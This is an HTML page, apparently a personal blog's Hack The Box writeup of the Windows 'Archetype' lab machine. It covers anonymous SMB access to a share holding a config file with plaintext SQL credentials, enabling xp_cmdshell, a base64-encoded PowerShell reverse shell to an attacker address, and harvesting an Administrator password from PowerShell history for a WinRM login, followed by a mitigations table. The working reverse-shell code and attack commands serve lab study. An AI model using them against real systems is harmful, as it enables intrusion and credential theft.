@@ -1,0 +1,199 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Archetype — Hack The Box writeup | Farhan Hussain</title>
+<meta name="description" content="An SMB backups share was accessible without credentials and contained a SSIS .dtsConfig file with plaintext SQL Server credentials. The account turned out…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/archetype.html">
+<meta property="og:title" content="Archetype — Hack The Box writeup">
+<meta property="og:description" content="An SMB backups share was accessible without credentials and contained a SSIS .dtsConfig file with plaintext SQL Server credentials. The account turned out…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/archetype.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Archetype — Hack The Box writeup","description":"An SMB backups share was accessible without credentials and contained a SSIS .dtsConfig file with plaintext SQL Server credentials. The account turned out…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-10-14","url":"https://thecyberfarhan.github.io/writeups/archetype.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/archetype.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>Hack The Box writeup</p>
+  <h1 data-reveal>Archetype</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">Hack The Box</span>
+    <span class="diff">Very Easy</span>
+    <span>October 14, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>An SMB <code>backups</code> share was accessible without credentials and contained a SSIS <code>.dtsConfig</code> file with plaintext SQL Server credentials. The account turned out to be a sysadmin — enough to enable <code>xp_cmdshell</code> and run arbitrary commands. A base64-encoded PowerShell reverse shell delivered via <code>xp_cmdshell</code> landed a shell as <code>sql_svc</code>. PowerShell's <code>ConsoleHost_history.txt</code> contained a <code>net use</code> command run by someone mapping a drive with the Administrator password in plaintext. Evil-WinRM with those credentials closed the box. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">📂 smbclient / smbmap</span><span class="chip">🗄 impacket-mssqlclient</span><span class="chip">🐚 Netcat (nc.exe, Windows)</span><span class="chip">🐍 Python HTTP server</span><span class="chip">💻 Evil-WinRM</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Archetype</strong> — HackTheBox's introductory Windows machine from the Starting Point track. It's a clean, well-structured walkthrough of a Windows-specific attack chain that doesn't appear in Linux-only CTF series: SMB misconfiguration exposing a configuration file, MSSQL sysadmin escalation to OS command execution, and credential reuse discovered through PowerShell's command history file — a real-world finding that shows up in actual Windows engagements regularly. The box also requires working with Windows-specific shell delivery (PowerShell one-liners, UTF-16LE base64 encoding), making it a useful environment calibration exercise for Windows targets specifically.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What SMB null sessions are and how anonymous share access is enumerated</li><li>What a <code>.dtsConfig</code> file is (SQL Server Integration Services package configuration — stores connection strings, often with credentials)</li><li>What MSSQL <code>xp_cmdshell</code> is and the <code>sp_configure</code> sequence required to enable it</li><li>Why PowerShell command payloads need UTF-16LE encoding (PowerShell's <code>-EncodedCommand</code> flag expects UTF-16LE base64, not UTF-8)</li><li>What <code>ConsoleHost_history.txt</code> is and why it's worth reading on any Windows foothold</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.129.95.187 -r 1-65535 --ulimit 5000 -b 500 -t 2000 -- -Pn -sV -sC -T4</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version / Detail</th></tr></thead><tbody><tr><td>135/tcp</td><td>MSRPC</td><td>Microsoft Windows RPC</td></tr><tr><td>139/tcp</td><td>NetBIOS-SSN</td><td>Windows netbios-ssn</td></tr><tr><td>1433/tcp</td><td>MSSQL</td><td>Microsoft SQL Server 2017 RTM (14.00.1000.00)</td></tr><tr><td>5985/tcp</td><td>WinRM</td><td>Microsoft HTTPAPI 2.0 — WinRM endpoint</td></tr><tr><td>47001/tcp</td><td>HTTP</td><td>Microsoft HTTPAPI 2.0</td></tr><tr><td>49664/tcp, 49666/tcp</td><td>MSRPC</td><td>Windows RPC ephemeral ports</td></tr></tbody></table>
+<p>Two immediately interesting services: <strong>MSSQL on 1433</strong> (authenticated command execution potential via <code>xp_cmdshell</code>) and <strong>WinRM on 5985</strong> (remote shell if valid credentials are found). The machine name is <code>ARCHETYPE</code>, confirmed in the MSSQL NTLM info output.</p>
+<h3>SMB Enumeration</h3>
+<pre><code>smbclient -L //10.129.95.187 -N</code></pre>
+
+<pre><code>Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backups         Disk
+C$              Disk      Default share
+IPC$            IPC       Remote IPC</code></pre>
+<p><code>backups</code> stands out — a non-default share with no description. The administrative shares (<code>ADMIN$</code>, <code>C$</code>) are standard Windows defaults and require credentials.</p>
+<pre><code>smbclient //10.129.95.187/backups -N</code></pre>
+
+<pre><code>smb: \&gt; dir
+  prod.dtsConfig    AR    609    Mon Jan 20 17:23:02 2020</code></pre>
+<p>Anonymous access to <code>backups</code> works, and it contains a single file: <code>prod.dtsConfig</code>.</p>
+<pre><code>smb: \&gt; get prod.dtsConfig</code></pre>
+
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~8 mins into the box)</p>
+<h3>Credentials in prod.dtsConfig</h3>
+<pre><code>&lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
+Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
+Auto Translate=False;&lt;/ConfiguredValue&gt;</code></pre>
+<p>A <code>.dtsConfig</code> file is an XML-formatted configuration file used by SQL Server Integration Services (SSIS) packages to store connection parameters. Storing credentials in these files — particularly in a network share — is a common misconfiguration in Windows environments. The credentials are always plaintext; there is no encryption.</p>
+<p><strong>Credentials found:</strong></p>
+<table><thead><tr><th>Username</th><th>Password</th><th>Service</th></tr></thead><tbody><tr><td><code>ARCHETYPE\sql_svc</code></td><td><code>M3g4c0rp123</code></td><td>Microsoft SQL Server</td></tr></tbody></table>
+<h3>MSSQL Login — Sysadmin Confirmation</h3>
+<pre><code>impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth</code></pre>
+
+<pre><code>[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
+SQL (ARCHETYPE\sql_svc  dbo@master)&gt;</code></pre>
+<p class="aside">Checking privilege level:</p>
+<pre><code>SELECT IS_SRVROLEMEMBER('sysadmin');</code></pre>
+
+<pre><code>-
+1</code></pre>
+<p><code>sql_svc</code> is a sysadmin. This is significant — sysadmin in MSSQL is the highest privilege level, and it's sufficient to enable <code>xp_cmdshell</code>, a stored procedure that executes OS commands in the context of the SQL Server service account.</p>
+<h3>Enabling xp_cmdshell</h3>
+<p><code>xp_cmdshell</code> is disabled by default in modern SQL Server installations but can be re-enabled by a sysadmin via <code>sp_configure</code>:</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;</code></pre>
+<p class="aside">Confirming OS-level command execution:</p>
+<pre><code>xp_cmdshell "whoami"</code></pre>
+
+<pre><code>output
+-----------------
+archetype\sql_svc</code></pre>
+<p>OS-level RCE as the SQL Server service account.</p>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~20 mins into the box)</p>
+<h3>Delivering a Reverse Shell via xp_cmdshell</h3>
+<p>Direct PowerShell commands with URL paths fail inside <code>xp_cmdshell</code> due to SQL Server's handling of forward slashes (<code>/</code>) as syntax:</p>
+<pre><code>xp_cmdshell "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://...')"
+-- ERROR: Incorrect syntax near '/'</code></pre>
+<p>The solution is to encode the entire PowerShell command as UTF-16LE base64 and pass it via PowerShell's <code>-EncodedCommand</code> (or <code>-e</code>) flag, which accepts the command as a single opaque string with no special characters to escape.</p>
+<p><strong>Why UTF-16LE specifically?</strong> PowerShell is built on .NET, which uses UTF-16LE as its native string encoding. The <code>-EncodedCommand</code> flag expects a base64-encoded UTF-16LE string. Encoding as UTF-8 base64 (the default on Linux) produces the wrong bytes — each character becomes two bytes in UTF-16LE, so a UTF-8 encode produces half the expected length and the command silently fails or runs garbage.</p>
+<p class="aside">Encoding on Linux:</p>
+<pre><code>echo -n '&lt;powershell_command&gt;' | iconv -t UTF-16LE | base64 -w 0</code></pre>
+<p>The <code>iconv -t UTF-16LE</code> step converts the UTF-8 output of <code>echo</code> to UTF-16LE before base64 encoding.</p>
+<p><strong>First attempt — nc.exe download + execute:</strong> The encoded command was built to download <code>nc.exe</code> from the attacker's Python HTTP server and then execute it. The download appeared to succeed (HTTP 200 in the Python server log), but <code>nc.exe</code> was referred to as <code>c.exe</code> in the decoded command — a path corruption artefact from null bytes in the UTF-16LE encoding of the backslash-escaped path string. Abandoned in favour of a self-contained PowerShell reverse shell.</p>
+<p><strong>Working payload — pure PowerShell reverse shell (no nc.exe):</strong></p>
+<pre><code>$client = New-Object System.Net.Sockets.TCPClient("10.10.15.1",443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String);
+    $sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()</code></pre>
+<p class="aside">Encoded and delivered:</p>
+<pre><code>echo -n '$client = New-Object ...' | iconv -t UTF-16LE | base64 -w 0
+# → &lt;base64_string&gt;</code></pre>
+
+<pre><code>xp_cmdshell "powershell -e &lt;base64_string&gt;"</code></pre>
+<p class="aside">Listener:</p>
+<pre><code>nc -lvnp 443</code></pre>
+
+<pre><code>connect to [10.10.15.1] from (UNKNOWN) [10.129.95.187] 49675
+PS C:\Windows\system32&gt;</code></pre>
+<p class="aside">Navigating to the user flag:</p>
+<pre><code>PS C:\Windows\system32&gt; cd C:\Users\sql_svc\Desktop
+PS C:\Users\sql_svc\Desktop&gt; type user.txt
+3e7b102e78218e935bf3f4951fec21a3</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~30 mins into the box)</p>
+<h3>PSReadLine History — Administrator Password</h3>
+<p><strong>What is ConsoleHost_history.txt?</strong> PowerShell's <code>PSReadLine</code> module saves a persistent history of commands entered in interactive sessions to a per-user text file at a predictable path. On Windows 10/Server 2019+, this is:</p>
+<pre><code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
+<p>This file is not cleared on logout, is not protected by any special permissions beyond normal user file ACLs, and is frequently overlooked in privilege escalation checks. In real engagements it's one of the first files to read on any Windows foothold.</p>
+<pre><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
+
+<pre><code>net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit</code></pre>
+<p>An Administrator credential, used in a <code>net use</code> command to map a drive — typed interactively into PowerShell and duly logged by PSReadLine.</p>
+<h3>WinRM Login as Administrator</h3>
+<pre><code>evil-winrm -i 10.129.95.187 -u Administrator -p 'MEGACORP_4dm1n!!'</code></pre>
+
+<pre><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+b91ccec3305e98240082d4474b848528</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>SMB null session</strong> → anonymous <code>backups</code> share → <code>prod.dtsConfig</code> → <code>sql_svc:M3g4c0rp123</code></li><li><strong>impacket-mssqlclient</strong> with Windows auth → confirmed sysadmin → enabled <code>xp_cmdshell</code></li><li><strong>UTF-16LE base64-encoded PowerShell reverse shell</strong> via <code>xp_cmdshell</code> → shell as <code>archetype\sql_svc</code> → user flag</li><li><strong>PSReadLine <code>ConsoleHost_history.txt</code></strong> → <code>net use</code> command with <code>Administrator:MEGACORP_4dm1n!!</code> in plaintext</li><li><strong>Evil-WinRM</strong> as Administrator → root flag</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>nc.exe Path Corruption via UTF-16LE Encoding</h3>
+<p>The first encoded PowerShell payload combined a <code>DownloadFile</code> call and an immediate <code>nc.exe</code> execution in a single command. The base64 encode used backslash-escaped Windows paths (<code>C:\Users\Public\nc.exe</code>), which — when run through <code>echo -n "..." | iconv -t UTF-16LE | base64</code> from within a bash double-quoted string — produced null bytes at the backslash positions, truncating the path to <code>C:</code> and then <code>c.exe</code>. The decoded command tried to run <code>c.exe</code> instead of <code>C:\Users\Public\nc.exe</code>, which obviously wasn't found. The fix was switching to a pure PowerShell TCP reverse shell with no filesystem paths at all, which encoded cleanly.</p>
+<h3>smbmap Initial Access Denied</h3>
+<p><code>smbmap -H 10.129.95.187</code> returned "Access denied" with no authenticated session established — smbmap requires a valid (or at minimum guest-level) session that this configuration didn't grant anonymously. <code>smbclient -L //... -N</code> succeeded instead, and the <code>backups</code> share was directly accessible with <code>-N</code>. The two tools handle unauthenticated enumeration slightly differently; when one fails, try the other.</p>
+<h3>xp_cmdshell Syntax Errors on Direct PowerShell with URLs</h3>
+<p>Several attempts to pass PowerShell download commands directly through <code>xp_cmdshell "powershell -c ..."</code> failed with <code>Incorrect syntax near '/'</code>. SQL Server's parser interprets the forward slashes in <code>http://</code> as a division operator in certain contexts before the string ever reaches PowerShell. The <code>-EncodedCommand</code> flag sidesteps this entirely since the payload is a single opaque base64 string.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>SSIS <code>.dtsConfig</code> with plaintext credentials in anonymous SMB share</td><td class="sev-critical">Critical</td><td>Never store credentials in SSIS config files; use Windows credential stores or encrypted connection managers; never expose configuration shares without authentication</td></tr><tr><td>SQL Server service account with sysadmin role</td><td class="sev-high">High</td><td>Service accounts should have the minimum required SQL Server permissions; sysadmin should be reserved for DBAs, never service accounts</td></tr><tr><td><code>xp_cmdshell</code> enabled (or re-enableable by a compromised sysadmin)</td><td class="sev-high">High</td><td>Disable <code>xp_cmdshell</code> and audit who has permission to re-enable it; consider using SQL Server's surface area configuration to restrict it at a deeper level</td></tr><tr><td>Administrator password typed in plaintext in a <code>net use</code> command</td><td class="sev-critical">Critical</td><td>Never include credentials in command-line arguments — they persist in shell history files; use <code>cmdkey</code> or Windows Credential Manager for persistent drive mappings</td></tr><tr><td>PSReadLine history file accumulating sensitive commands</td><td class="sev-medium">Medium</td><td>Clear <code>ConsoleHost_history.txt</code> periodically; consider setting <code>Set-PSReadLineOption -HistorySaveStyle SaveNothing</code> on sensitive administrative accounts</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b><code>ConsoleHost_history.txt</code> is the Windows equivalent of <code>.bash_history</code> — and people are far less likely to think about clearing it. Any administrator who has typed credentials into a PowerShell prompt has potentially left them in this file, readable by anyone who subsequently compromises that account's session. It should be on every Windows post-exploitation checklist, right after <code>sudo -l</code> equivalents.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Skip the <code>nc.exe</code> staging entirely and go straight to the pure PowerShell reverse shell — it's self-contained, requires no file transfer, and avoids the whole class of path-encoding problems that come with combining download and execute in a single <code>-EncodedCommand</code> payload. On Windows targets, fewer moving parts means fewer failure modes.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/HackTheBox/archetype_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
